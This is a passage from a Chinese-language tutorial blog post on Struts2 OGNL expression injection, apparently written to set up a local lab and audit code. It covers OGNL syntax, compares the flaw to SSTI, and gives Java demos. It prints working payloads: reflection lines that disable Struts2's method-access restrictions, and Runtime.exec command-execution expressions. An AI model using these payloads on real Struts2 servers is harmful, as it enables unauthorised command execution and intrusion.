+<h3 id="OGNL-基本语法"><a href="#OGNL-基本语法" class="headerlink" title="OGNL 基本语法"></a>OGNL 基本语法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 访问对象属性</span></span><br><span class="line">user.name</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用方法</span></span><br><span class="line">user.getName()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用静态方法（关键）</span></span><br><span class="line"><span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建对象</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(...)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问上下文变量（# 开头）</span></span><br><span class="line">#context</span><br><span class="line">#_memberAccess</span><br><span class="line">#request</span><br><span class="line">#response</span><br></pre></td></tr></table></figure>
+
+<p><code>#</code> 开头的变量是访问 OGNL 上下文里的对象，Struts2 把很多关键对象都放在上下文里，比如 <code>HttpServletRequest</code>、<code>HttpServletResponse</code>，所以能直接拿来用。</p>
+<blockquote>
+<p>注意：OGNL 里没有 <code>import</code> 机制，不认识短类名，必须写类的全限定名，比如 <code>@java.lang.Runtime@getRuntime()</code>，不能简写成 <code>@Runtime@getRuntime()</code>。</p>
+</blockquote>
+<h3 id="为什么能执行系统命令"><a href="#为什么能执行系统命令" class="headerlink" title="为什么能执行系统命令"></a>为什么能执行系统命令</h3><p>Java 里执行系统命令的标准写法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>翻译成 OGNL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@java.lang.Runtime@getRuntime().exec(&quot;id&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>完全一一对应，OGNL 就是把 Java 代码用表达式的方式写出来，能写什么取决于你能调用哪些 Java API。</p>
+<h3 id="为什么需要前两行绕过"><a href="#为什么需要前两行绕过" class="headerlink" title="为什么需要前两行绕过"></a>为什么需要前两行绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false</span><br><span class="line">#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;)</span><br><span class="line">#f.setAccessible(true)</span><br><span class="line">#f.set(#_memberAccess,true)</span><br></pre></td></tr></table></figure>
+
+<p>Struts2 默认：</p>
+<ul>
+<li><code>denyMethodExecution=true</code> → 禁止调用方法</li>
+<li><code>allowStaticMethodAccess=false</code> → 禁止调用静态方法</li>
+</ul>
+<p><code>@java.lang.Runtime@getRuntime()</code> 是静态方法调用，不关掉这两个限制直接报错，所以要先用反射把这两个字段改掉，相当于把安全锁撬开，再去执行后面的命令。</p>
+<h3 id="整个执行流程"><a href="#整个执行流程" class="headerlink" title="整个执行流程"></a>整个执行流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">用户输入 redirect:$&#123;...&#125;</span><br><span class="line">        ↓</span><br><span class="line">Struts2 解析 redirect: 前缀</span><br><span class="line">        ↓</span><br><span class="line">把后面的 $&#123;...&#125; 丢给 OGNL 引擎求值</span><br><span class="line">        ↓</span><br><span class="line">OGNL 引擎执行里面的 Java 表达式</span><br><span class="line">        ↓</span><br><span class="line">Runtime.exec(&quot;id&quot;) 被执行</span><br><span class="line">        ↓</span><br><span class="line">结果写回 HttpServletResponse</span><br></pre></td></tr></table></figure>
+
+<p>问题就在第三步——用户输入的内容被当成代码执行了，这就是注入漏洞的本质。</p>
+<hr>
+<h2 id="五、表达式注入类比"><a href="#五、表达式注入类比" class="headerlink" title="五、表达式注入类比"></a>五、表达式注入类比</h2><h3 id="SSTI-和-OGNL-注入的共同本质"><a href="#SSTI-和-OGNL-注入的共同本质" class="headerlink" title="SSTI 和 OGNL 注入的共同本质"></a>SSTI 和 OGNL 注入的共同本质</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户输入  →  被当成&quot;可执行的东西&quot;处理  →  代码执行</span><br></pre></td></tr></table></figure>
+
+<p>区别只在于”可执行的东西”是什么：</p>
+<table>
+<thead>
+<tr>
+<th>漏洞类型</th>
+<th>解析引擎</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SSTI（Jinja2&#x2F;Twig&#x2F;Freemarker）</td>
+<td>模板引擎解析用户输入</td>
+</tr>
+<tr>
+<td>OGNL 注入（Struts2）</td>
+<td>OGNL 表达式引擎解析用户输入</td>
+</tr>
+<tr>
+<td>EL 注入（Spring）</td>
+<td>EL 表达式引擎解析用户输入</td>
+</tr>
+</tbody></table>
+<p>都是同一类漏洞，叫<strong>表达式注入</strong>，SSTI 只是其中模板引擎那个分支的名字。</p>
+<h3 id="具体类比"><a href="#具体类比" class="headerlink" title="具体类比"></a>具体类比</h3><p>Jinja2 SSTI：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line">template = <span class="string">&quot;Hello &quot;</span> + user_input  <span class="comment"># 用户输入被拼进模板</span></span><br><span class="line">render(template)                   <span class="comment"># 模板引擎执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Payload</span></span><br><span class="line">&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;          →  返回 <span class="number">49</span></span><br><span class="line">&#123;&#123;config.items()&#125;&#125;  →  读配置</span><br></pre></td></tr></table></figure>
+
+<p>Struts2 OGNL：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 服务端</span></span><br><span class="line"><span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> user_input  <span class="comment">// redirect: 后面的内容</span></span><br><span class="line">ognl.evaluate(result)       <span class="comment">// OGNL 引擎执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Payload</span></span><br><span class="line">$&#123;<span class="number">1</span>+<span class="number">1</span>&#125;                                        →  返回 <span class="number">2</span></span><br><span class="line">$&#123;<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&quot;id&quot;</span>)&#125; →  RCE</span><br></pre></td></tr></table></figure>
+
+<p>逻辑完全一样，只是语法不同。</p>
+<h3 id="为什么-OGNL-比-Jinja2-SSTI-更危险"><a href="#为什么-OGNL-比-Jinja2-SSTI-更危险" class="headerlink" title="为什么 OGNL 比 Jinja2 SSTI 更危险"></a>为什么 OGNL 比 Jinja2 SSTI 更危险</h3><p>Jinja2 要 RCE 需要找绕过沙箱的链，比较麻烦。OGNL 直接就是 Java 表达式，<code>Runtime.exec()</code> 就在那里，调用路径短得多，而且 Java 反射能力极强，沙箱再严也容易绕。</p>
+<p>完全可以把 <strong>OGNL 注入理解成 Java 世界的 SSTI</strong>。</p>
+<hr>
+<h2 id="六、OGNL-示例代码"><a href="#六、OGNL-示例代码" class="headerlink" title="六、OGNL 示例代码"></a>六、OGNL 示例代码</h2><p>光看概念还是有点抽象，自己写代码跑一跑感受更直观。新建一个 Java Maven 空项目。</p>
+<h3 id="示例-1：基础用法"><a href="#示例-1：基础用法" class="headerlink" title="示例 1：基础用法"></a>示例 1：基础用法</h3><p><code>pom.xml</code> 里加上 OGNL 依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ognl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ognl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OgnlDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 最简单：数学计算</span></span><br><span class="line">        <span class="comment">// Ognl.getValue()    →  OGNL 引擎的入口方法，把第一个参数当表达式执行</span></span><br><span class="line">        <span class="comment">// &quot;1+1&quot;              →  表达式字符串，就是要执行的&quot;代码&quot;</span></span><br><span class="line">        <span class="comment">// new OgnlContext()  →  OGNL 上下文，存放 #context #request 这些变量的容器，现在是空的</span></span><br><span class="line">        <span class="comment">// new Object()       →  root 对象，表达式里不带 # 的属性访问从这里找，现在也是空的</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;1+1&quot;</span>, <span class="keyword">new</span> <span class="title class_">OgnlContext</span>(), <span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">        System.out.println(<span class="string">&quot;1+1 = &quot;</span> + result);  <span class="comment">// 输出 2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 调用 Java 静态方法</span></span><br><span class="line">        <span class="comment">// @java.lang.System@  →  OGNL 调用静态类的语法，@ 开头 @ 结尾包住类名，表示访问这个类</span></span><br><span class="line">        <span class="comment">// getProperty(&#x27;os.name&#x27;) →  调用 System.getProperty() 静态方法</span></span><br><span class="line">        <span class="comment">// 翻译成普通 Java：String result2 = System.getProperty(&quot;os.name&quot;);</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result2</span> <span class="operator">=</span> Ognl.getValue(</span><br><span class="line">                <span class="string">&quot;@java.lang.System@getProperty(&#x27;os.name&#x27;)&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">OgnlContext</span>(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>()</span><br><span class="line">        );</span><br><span class="line">        System.out.println(<span class="string">&quot;OS: &quot;</span> + result2);  <span class="comment">// 输出操作系统名</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 模拟用户输入被当成表达式执行（漏洞本质）</span></span><br><span class="line">        <span class="comment">// userInput 是一个普通字符串，但被传进了 Ognl.getValue()</span></span><br><span class="line">        <span class="comment">// 字符串就变成了可执行的代码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">userInput</span> <span class="operator">=</span> <span class="string">&quot;@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;)&quot;</span>;</span><br><span class="line">        Ognl.getValue(userInput, <span class="keyword">new</span> <span class="title class_">OgnlContext</span>(), <span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">        <span class="comment">// Windows 下直接弹计算器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行效果：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_f9zw.png"></p>
+<p>三段代码都执行了。</p>
+<p><strong>关键点就在这里：</strong></p>
+<ul>
+<li><code>userInput</code> 是一个普通字符串</li>
+<li>但是被传进了 <code>Ognl.getValue()</code></li>
+<li>字符串就变成了可执行的代码</li>
+</ul>
+<p>这就是注入漏洞的本质——<strong>数据和代码的边界消失了</strong>。</p>
+<hr>
+<h3 id="示例-2：root-对象与-context-的区别"><a href="#示例-2：root-对象与-context-的区别" class="headerlink" title="示例 2：root 对象与 context 的区别"></a>示例 2：root 对象与 context 的区别</h3><p>OGNL 里有两种访问方式，搞清楚 <code>root</code> 和 <code>context</code> 的区别很重要，Payload 里大量用到 <code>#</code> 前缀就是在访问 <code>context</code>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OgnlDemo2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模拟一个普通的 Java 对象，作为 root</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">        <span class="comment">//两个私有字段</span></span><br><span class="line">        <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;张三&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">18</span>;</span><br><span class="line">        <span class="comment">//一个公共的字段</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123; <span class="keyword">return</span> age; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hello, 我是&quot;</span> + name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> a + b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================== 准备环境 ====================</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();       <span class="comment">// root 对象，不带 # 的表达式从这里找属性</span></span><br><span class="line">        <span class="type">OgnlContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OgnlContext</span>();  <span class="comment">// context 上下文，带 # 的表达式从这里找</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟 Struts2 往 context 里塞关键对象</span></span><br><span class="line">        context.put(<span class="string">&quot;myVar&quot;</span>, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;num&quot;</span>, <span class="number">100</span>);</span><br><span class="line">        context.put(<span class="string">&quot;user2&quot;</span>, <span class="keyword">new</span> <span class="title class_">User</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================== 访问 root 对象 ====================</span></span><br><span class="line">        <span class="comment">// 直接写属性名，从 root 对象找</span></span><br><span class="line">        <span class="comment">// 私有字段会自动调用 getter，没有 getter 就会报错</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">r1</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;name&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;root.name = &quot;</span> + r1);  <span class="comment">// 张三</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">r2</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;age&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;root.age = &quot;</span> + r2);   <span class="comment">// 18</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 公共字段可以直接访问</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">r3</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;c&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;root.c = &quot;</span> + r3);     <span class="comment">// 10</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用 root 对象的方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">r4</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;sayHello()&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;sayHello() = &quot;</span> + r4); <span class="comment">// Hello, 我是张三</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">r5</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;add(1, 2)&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;add(1, 2) = &quot;</span> + r5);  <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================== 访问 context 变量 ====================</span></span><br><span class="line">        <span class="comment">// # 开头，从 context 这个 Map 里找</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">c1</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#myVar&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;#myVar = &quot;</span> + c1);      <span class="comment">// hello</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">c2</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#num + 1&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;#num+1 = &quot;</span> + c2);      <span class="comment">// 101</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 访问 context 里存的对象的属性</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">c3</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#user2.name&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;#user2.name = &quot;</span> + c3); <span class="comment">// 张三</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">c4</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#user2.sayHello()&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;#user2.sayHello() = &quot;</span> + c4); <span class="comment">// Hello, 我是张三</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================== 在 context 里赋值 ====================</span></span><br><span class="line">        <span class="comment">// # 变量可以在表达式里直接赋值，相当于声明临时变量</span></span><br><span class="line">        <span class="comment">// Payload 里的 #matt = #context.get(...) 就是这种写法</span></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;#tmp = &#x27;world&#x27;&quot;</span>, context, user);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c5</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#tmp&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;#tmp = &quot;</span> + c5);        <span class="comment">// world</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 链式赋值 + 计算</span></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;#a = #num, #b = #a + 99, #b&quot;</span>, context, user);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c6</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#b&quot;</span>, context, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;#b = &quot;</span> + c6);          <span class="comment">// 199</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_sq3a.png"></p>
+<p>这个示例把 OGNL 里 <code>root</code> 和 <code>#context</code> 的用法都演示了一遍，Payload 里的 <code>#matt=#context.get(&quot;...&quot;)</code> 就是从 context 这个 Map 里取出 <code>HttpServletResponse</code>，然后用它写回显，原理就是这样。</p>
+<hr>
+<h2 id="七、搭建-Struts2-靶场（本地复现）"><a href="#七、搭建-Struts2-靶场（本地复现）" class="headerlink" title="七、搭建 Struts2 靶场（本地复现）"></a>七、搭建 Struts2 靶场（本地复现）</h2><p>后面要做代码审计，需要一个自己能调试的 Struts2 环境。</p>
+<h3 id="新建-Tomcat-项目"><a href="#新建-Tomcat-项目" class="headerlink" title="新建 Tomcat 项目"></a>新建 Tomcat 项目</h3><p>新建一个 Tomcat 项目（配置过程就不赘述了）：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_qkpa.png"></p>
+<p>访问 <code>http://localhost:8080/</code> 可以正常访问：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_45a4.png"></p>
+<h3 id="四个文件配置"><a href="#四个文件配置" class="headerlink" title="四个文件配置"></a>四个文件配置</h3><p><code>pom.xml</code> 里加上 Struts2 依赖，找到 <code>&lt;dependencies&gt;</code> 标签加进去：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.struts<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>struts2-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>加完 Maven 刷新一下，然后按顺序把下面四个文件建好。</p>
+<hr>
+<p><strong>第一个：HelloAction.java</strong></p>
+<p>在 <code>src/main/java</code> 下建包 <code>com.demo</code>，新建 <code>HelloAction.java</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ActionSupport 是 Struts2 提供的基类，继承它就能获得 Struts2 的标准功能</span></span><br><span class="line"><span class="comment">// 所有 Action 类一般都继承它</span></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Struts2 会自动把 URL 参数绑定到 Action 的字段上</span></span><br><span class="line">    <span class="comment">// 比如请求 ?name=张三，Struts2 自动调用 setName(&quot;张三&quot;)</span></span><br><span class="line">    <span class="comment">// 原理就是 OGNL 的属性绑定机制</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// execute() 是 Struts2 默认调用的方法，请求进来之后框架自动调这个</span></span><br><span class="line">    <span class="comment">// SUCCESS 是 ActionSupport 里定义的常量，值就是字符串 &quot;success&quot;</span></span><br><span class="line">    <span class="comment">// 返回 SUCCESS 就跳转到 struts.xml 里配置的 result</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>整个流程：</p>
